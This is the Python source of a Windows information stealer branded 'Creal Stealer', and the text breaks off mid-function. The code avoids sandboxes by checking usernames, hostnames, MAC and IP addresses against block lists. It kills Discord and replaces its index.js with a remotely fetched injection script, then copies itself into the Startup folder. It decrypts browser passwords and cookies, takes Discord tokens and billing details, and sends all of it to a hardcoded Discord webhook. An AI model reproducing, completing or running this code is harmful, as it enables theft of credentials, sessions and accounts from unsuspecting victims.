import os
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import *
import time
import shutil
from zipfile import ZipFile
import random
import re
import subprocess
import sys
import shutil
import uuid
import socket
import getpass
import ctypes







blacklistUsers = ['WDAGUtilityAccount', '3W1GJT', 'QZSBJVWM', '5ISYH9SH', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg']

username = getpass.getuser()

if username.lower() in blacklistUsers:
    os._exit(0)

def kontrol():

    blacklistUsername = ['BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']

    hostname = socket.gethostname()

    if any(name in hostname for name in blacklistUsername):
        os._exit(0)

kontrol()

BLACKLIST1 = ['00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de', '00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40', '42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01', '42:85:07:f4:83:d0', '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c', '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa', '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3', '00:15:5d:b6:e0:cc', '00:15:5d:00:02:26', '00:50:56:b3:05:b4', '1c:99:57:1c:ad:e4', '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:45:03', '12:8a:5c:2a:65:d1', '00:25:90:36:f0:3b', '00:1b:21:13:21:26', '42:01:0a:8a:00:22', '00:1b:21:13:32:51', 'a6:24:aa:ae:e6:12', '08:00:27:45:13:10', '00:1b:21:13:26:44', '3c:ec:ef:43:fe:de', 'd4:81:d7:ed:25:54', '00:25:90:36:65:38', '00:03:47:63:8b:de', '00:15:5d:00:05:8d', '00:0c:29:52:52:50', '00:50:56:b3:42:33', '3c:ec:ef:44:01:0c', '06:75:91:59:3e:02', '42:01:0a:8a:00:33', 'ea:f6:f1:a2:33:76', 'ac:1f:6b:d0:4d:98', '1e:6c:34:93:68:64', '00:50:56:a0:61:aa', '42:01:0a:96:00:22', '00:50:56:b3:21:29', '00:15:5d:00:00:b3', '96:2b:e9:43:96:76', 'b4:a9:5a:b1:c6:fd', 'd4:81:d7:87:05:ab', 'ac:1f:6b:d0:49:86', '52:54:00:8b:a6:08', '00:0c:29:05:d8:6e', '00:23:cd:ff:94:f0', '00:e0:4c:d6:86:77', '3c:ec:ef:44:01:aa', '00:15:5d:23:4c:a3', '00:1b:21:13:33:55', '00:15:5d:00:00:a4', '16:ef:22:04:af:76', '00:15:5d:23:4c:ad', '1a:6c:62:60:3b:f4', '00:15:5d:00:00:1d', '00:50:56:a0:cd:a8', '00:50:56:b3:fa:23', '52:54:00:a0:41:92', '00:50:56:b3:f6:57', '00:e0:4c:56:42:97', 'ca:4d:4b:ca:18:cc', 'f6:a5:41:31:b2:78', 'd6:03:e4:ab:77:8e', '00:50:56:ae:b2:b0', '00:50:56:b3:94:cb', '42:01:0a:8e:00:22', '00:50:56:b3:4c:bf', '00:50:56:b3:09:9e', '00:50:56:b3:38:88', '00:50:56:a0:d0:fa', '00:50:56:b3:91:c8', '3e:c1:fd:f1:bf:71', '00:50:56:a0:6d:86', '00:50:56:a0:af:75', '00:50:56:b3:dd:03', 'c2:ee:af:fd:29:21', '00:50:56:b3:ee:e1', '00:50:56:a0:84:88', '00:1b:21:13:32:20', '3c:ec:ef:44:00:d0', '00:50:56:ae:e5:d5', '00:50:56:97:f6:c8', '52:54:00:ab:de:59', '00:50:56:b3:9e:9e', '00:50:56:a0:39:18', '32:11:4d:d0:4a:9e', '00:50:56:b3:d0:a7', '94:de:80:de:1a:35', '00:50:56:ae:5d:ea', '00:50:56:b3:14:59', 'ea:02:75:3c:90:9f', '00:e0:4c:44:76:54', 'ac:1f:6b:d0:4d:e4', '52:54:00:3b:78:24', '00:50:56:b3:50:de', '7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e', '5a:e2:a6:a4:44:db', '00:50:56:ae:6f:54', '42:01:0a:96:00:33', '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06', '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d', '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e']

mac_address = uuid.getnode()
if str(uuid.UUID(int=mac_address)) in BLACKLIST1:
    os._exit(0)


sblacklist = ['213.33.190.69', '195.239.51.4', '195.239.51.4', '213.33.190.122', '88.132.231.71', '207.102.138.83', '174.7.32.199', '204.101.161.32', '207.102.138.93', '78.139.8.50', '20.99.160.173', '88.153.199.169', '84.147.62.12', '194.154.78.160', '92.211.109.160', '195.74.76.222', '188.105.91.116', '34.105.183.68', '92.211.55.199', '79.104.209.33', '95.25.204.90', '34.145.89.174', '109.74.154.90', '109.145.173.169', '34.141.146.114', '212.119.227.151', '195.239.51.59', '192.40.57.234', '64.124.12.162', '34.142.74.220', '188.105.91.173', '109.74.154.91', '34.105.72.241', '109.74.154.92', '213.33.142.50', '109.74.154.91', '93.216.75.209', '192.87.28.103', '88.132.226.203', '195.181.175.105', '88.132.225.100', '92.211.192.144', '34.83.46.130', '188.105.91.143', '34.85.243.241', '34.141.245.25', '178.239.165.70', '84.147.54.113', '193.128.114.45', '95.25.81.24', '92.211.52.62', '88.132.227.238', '35.199.6.13', '80.211.0.97', '34.85.253.170', '23.128.248.46', '35.229.69.227', '34.138.96.23', '192.211.110.74', '35.237.47.12', '87.166.50.213', '34.253.248.228', '212.119.227.167', '193.225.193.201', '34.145.195.58', '34.105.0.27', '195.239.51.3', '35.192.93.107']

ip = subprocess.check_output('curl ifconfig.me', shell=True).decode('utf-8').strip()

if ip in sblacklist:
    exit()

wh00k = "https://discord.com/api/webhooks/1089257227342327838/GO8wHCaIHOsPn6jDHlUK1Rub1pCky7K3ldbDAqkIkNoxZpM34G5-rlOArmy-me8mEdlm"
inj_url = "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
    
DETECTED = False

def g3t1p():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

requirements = [
    ["requests", "requests"],
    ["Crypto.Cipher", "pycryptodome"],
]
for modl in requirements:
    try: __import__(modl[0])
    except:
        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
        time.sleep(3)

import requests
from Crypto.Cipher import AES

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
Threadlist = []


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def G3tD4t4(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return G3tD4t4(blob_out)

def D3kryptV4lU3(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

def L04dR3qu3sTs(methode, url, data='', files='', headers=''):
    for i in range(8): # max trys
        try:
            if methode == 'POST':
                if data != '':
                    r = requests.post(url, data=data)
                    if r.status_code == 200:
                        return r
                elif files != '':
                    r = requests.post(url, files=files)
                    if r.status_code == 200 or r.status_code == 413:
                        return r
        except:
            pass

def L04durl1b(wh00k, data='', files='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(wh00k, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(wh00k, data=data))
                return r
        except: 
            pass

def globalInfo():
    ip = g3t1p()
    us3rn4m1 = os.getenv("USERNAME")
    ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}')
    # print(ipdatanojson)
    ipdata = loads(ipdatanojson)
    # print(urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode())
    contry = ipdata["country_name"]
    contryCode = ipdata["country_code"].lower()
    sehir = ipdata["state"]

    globalinfo = f":flag_{contryCode}:  - `{us3rn4m1.upper()} | {ip} ({contry})`"
    return globalinfo


def TR6st(C00k13):
    # simple Trust Factor system
    global DETECTED
    data = str(C00k13)
    tim = re.findall(".google.com", data)
    # print(len(tim))
    if len(tim) < -1:
        DETECTED = True
        return DETECTED
    else:
        DETECTED = False
        return DETECTED
        
def G3tUHQFr13ndS(t0k3n):
    b4dg3List =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
    except:
        return False

    uhqlist = ''
    for friend in friendlist:
        Own3dB3dg4s = ''
        flags = friend['user']['public_flags']
        for b4dg3 in b4dg3List:
            if flags // b4dg3["Value"] != 0 and friend['type'] == 1:
                if not "House" in b4dg3["Name"]:
                    Own3dB3dg4s += b4dg3["Emoji"]
                flags = flags % b4dg3["Value"]
        if Own3dB3dg4s != '':
            uhqlist += f"{Own3dB3dg4s} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
    return uhqlist


process_list = os.popen('tasklist').readlines()


for process in process_list:
    if "Discord" in process:
        
        pid = int(process.split()[1])
        os.system(f"taskkill /F /PID {pid}")

def G3tb1ll1ng(t0k3n):
    headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        b1ll1ngjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except:
        return False
    
    if b1ll1ngjson == []: return "```None```"

    b1ll1ng = ""
    for methode in b1ll1ngjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                b1ll1ng += ":credit_card:"
            elif methode["type"] == 2:
                b1ll1ng += ":parking: "

    return b1ll1ng

def inj_discord():

    username = os.getlogin()

    folder_list = ['Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment']

    for folder_name in folder_list:
        deneme_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)
        if os.path.isdir(deneme_path):
            for subdir, dirs, files in os.walk(deneme_path):
                if 'app-' in subdir:
                    for dir in dirs:
                        if 'modules' in dir:
                            module_path = os.path.join(subdir, dir)
                            for subsubdir, subdirs, subfiles in os.walk(module_path):
                                if 'discord_desktop_core-' in subsubdir:
                                    for subsubsubdir, subsubdirs, subsubfiles in os.walk(subsubdir):
                                        if 'discord_desktop_core' in subsubsubdir:
                                            for file in subsubfiles:
                                                if file == 'index.js':
                                                    file_path = os.path.join(subsubsubdir, file)

                                                    inj_content = requests.get(inj_url).text

                                                    inj_content = inj_content.replace("%WEBHOOK%", wh00k)

                                                    with open(file_path, "w", encoding="utf-8") as index_file:
                                                        index_file.write(inj_content)
inj_discord()

def G3tB4dg31(flags):
    if flags == 0: return ''

    Own3dB3dg4s = ''
    b4dg3List =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    for b4dg3 in b4dg3List:
        if flags // b4dg3["Value"] != 0:
            Own3dB3dg4s += b4dg3["Emoji"]
            flags = flags % b4dg3["Value"]

    return Own3dB3dg4s

def G3tT0k4n1nf9(t0k3n):
    headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    us3rjs0n = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    us3rn4m1 = us3rjs0n["username"]
    hashtag = us3rjs0n["discriminator"]
    em31l = us3rjs0n["email"]
    idd = us3rjs0n["id"]
    pfp = us3rjs0n["avatar"]
    flags = us3rjs0n["public_flags"]
    n1tr0 = ""
    ph0n3 = ""

    if "premium_type" in us3rjs0n: 
        nitrot = us3rjs0n["premium_type"]
        if nitrot == 1:
            n1tr0 = "<a:DE_BadgeNitro:865242433692762122>"
        elif nitrot == 2:
            n1tr0 = "<a:DE_BadgeNitro:865242433692762122><a:autr_boost1:1038724321771786240>"
    if "ph0n3" in us3rjs0n: ph0n3 = f'{us3rjs0n["ph0n3"]}'

    return us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3

def ch1ckT4k1n(t0k3n):
    headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False

if getattr(sys, 'frozen', False):
    currentFilePath = os.path.dirname(sys.executable)
else:
    currentFilePath = os.path.dirname(os.path.abspath(__file__))

fileName = os.path.basename(sys.argv[0])
filePath = os.path.join(currentFilePath, fileName)

startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
startupFilePath = os.path.join(startupFolderPath, fileName)

if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower():
    with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
        shutil.copyfileobj(src_file, dst_file)


def upl05dT4k31(t0k3n, path):
    global wh00k
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3 = G3tT0k4n1nf9(t0k3n)

    if pfp == None: 
        pfp = "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
    else:
        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"

    b1ll1ng = G3tb1ll1ng(t0k3n)
    b4dg3 = G3tB4dg31(flags)
    friends = G3tUHQFr13ndS(t0k3n)
    if friends == '': friends = "```No Rare Friends```"
    if not b1ll1ng:
        b4dg3, ph0n3, b1ll1ng = "🔒", "🔒", "🔒"
    if n1tr0 == '' and b4dg3 == '': n1tr0 = "```None```"

    data = {
        "content": f'{globalInfo()} | `{path}`',
        "embeds": [
            {
            "color": 2895667,
            "fields": [
                {
                    "name": "<a:hyperNOPPERS:828369518199308388> Token:",
                    "value": f"```{t0k3n}```",
                    "inline": True
                },
                {
                    "name": "<:mail:750393870507966486> Email:",
                    "value": f"```{em31l}```",
                    "inline": True
                },
                {
                    "name": "<a:1689_Ringing_Phone:755219417075417088> Phone:",
                    "value": f"```{ph0n3}```",
                    "inline": True
                },
                {
                    "name": "<:mc_earth:589630396476555264> IP:",
                    "value": f"```{g3t1p()}```",
                    "inline": True
                },
                {
                    "name": "<:woozyface:874220843528486923> Badges:",
                    "value": f"{n1tr0}{b4dg3}",
                    "inline": True
                },
                {
                    "name": "<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Billing:",
                    "value": f"{b1ll1ng}",
                    "inline": True
                },
                {
                    "name": "<a:mavikirmizi:853238372591599617> HQ Friends:",
                    "value": f"{friends}",
                    "inline": False
                }
                ],
            "author": {
                "name": f"{us3rn4m1}#{hashtag} ({idd})",
                "icon_url": f"{pfp}"
                },
            "footer": {
                "text": "Creal Stealer",
                "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
            }
        ],
        "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
        "username": "Creal Stealer",
        "attachments": []
        }
    L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)


def R4f0rm3t(listt):
    e = re.findall("(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

def upload(name, link):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    if name == "crcook":
        rb = ' | '.join(da for da in cookiWords)
        if len(rb) > 1000: 
            rrrrr = R4f0rm3t(str(cookiWords))
            rb = ' | '.join(da for da in rrrrr)
        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                    "title": "Creal | Cookies Stealer",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealCookies.txt]({link})",
                    "color": 2895667,
                    "footer": {
                        "text": "Creal Stealer",
                        "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
                    }
                }
            ],
            "username": "Creal Stealer",
            "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
            "attachments": []
            }
        L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
        return

    if name == "crpassw":
        ra = ' | '.join(da for da in paswWords)
        if len(ra) > 1000: 
            rrr = R4f0rm3t(str(paswWords))
            ra = ' | '.join(da for da in rrr)

        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                    "title": "Creal | Password Stealer",
                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealPassword.txt]({link})",
                    "color": 2895667,
                    "footer": {
                        "text": "Creal Stealer",
                        "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
                    }
                }
            ],
            "username": "Creal",
            "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
            "attachments": []
            }
        L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
        return

    if name == "kiwi":
        data = {
            "content": f"{globalInfo()}",
            "embeds": [
                {
                "color": 2895667,
                "fields": [
                    {
                    "name": "Interesting files found on user PC:",
                    "value": link
                    }
                ],
                "author": {
                    "name": "Creal | File Stealer"
                },
                "footer": {
                    "text": "Creal Stealer",
                    "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
                }
                }
            ],
            "username": "Creal Stealer",
            "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
            "attachments": []
            }
        L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
        return




# def upload(name, tk=''):
#     headers = {
#         "Content-Type": "application/json",
#         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
#     }

#     # r = requests.post(hook, files=files)
#     LoadRequests("POST", hook, files=files)
    _




def wr1tef0rf1l3(data, name):
    path = os.getenv("TEMP") + f"\cr{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"<--Creal STEALER BEST -->\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

T0k3ns = ''
def getT0k3n(path, arg):
    if not os.path.exists(path): return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for t0k3n in re.findall(regex, line):
                        global T0k3ns
                        if ch1ckT4k1n(t0k3n):
                            if not t0k3n in T0k3ns:
                                # print(token)
                                T0k3ns += t0k3n
                                upl05dT4k31(t0k3n, path)

P4ssw = []
def getP4ssw(path, arg):
    global P4ssw, P4sswCount
    if not os.path.exists(path): return

    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0: return

    tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in paswWords: paswWords.append(old)
            P4ssw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {D3kryptV4lU3(row[2], master_key)}")
            P4sswCount += 1
    wr1tef0rf1l3(P4ssw, 'passw')

C00k13 = []    
def getC00k13(path, arg):
    global C00k13, CookiCount
    if not os.path.exists(path): return
    
    pathC = path + arg + "/Cookies"
    if os.stat(pathC).st_size == 0: return
    
    tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
    
    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in cookiWords: cookiWords.append(old)
            C00k13.append(f"{row[0]}	TRUE	/	FALSE	2597573456	{row[1]}	{D3kryptV4lU3(row[2], master_key)}")
            CookiCount += 1
    wr1tef0rf1l3(C00k13, 'cook')

def G3tD1sc0rd(path, arg):
    if not os.path.exists(f"{path}/Local State"): return

    pathC = path + arg

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])
    # print(path, master_key)
    
    for file in os.listdir(pathC):
        # print(path, file)
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                for t0k3n in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global T0k3ns
                    t0k3nDecoded = D3kryptV4lU3(b64decode(t0k3n.split('dQw4w9WgXcQ:')[1]), master_key)
                    if ch1ckT4k1n(t0k3nDecoded):
                        if not t0k3nDecoded in T0k3ns:
                            # print(token)
                            T0k3ns += t0k3nDecoded
                            # writeforfile(Tokens, 'tokens')
                            upl05dT4k31(t0k3nDecoded, path)

def GatherZips(paths1, paths2, paths3):
    thttht = []
    for patt in paths1:
        a = threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[5], patt[1]])
        a.start()
        thttht.append(a)

    for patt in paths2:
        a = threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)
    
    a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht: 
        thread.join()
    global WalletsZip, GamingZip, OtherZip
        # print(WalletsZip, GamingZip, OtherZip)

    wal, ga, ot = "",'',''
    if not len(WalletsZip) == 0:
        wal = ":coin:  •  Wallets\n"
        for i in WalletsZip:
            wal += f"└─ [{i[0]}]({i[1]})\n"
    if not len(WalletsZip) == 0:
        ga = ":video_game:  •  Gaming:\n"
        for i in GamingZip:
            ga += f"└─ [{i[0]}]({i[1]})\n"
    if not len(OtherZip) == 0:
        ot = ":tickets:  •  Apps\n"
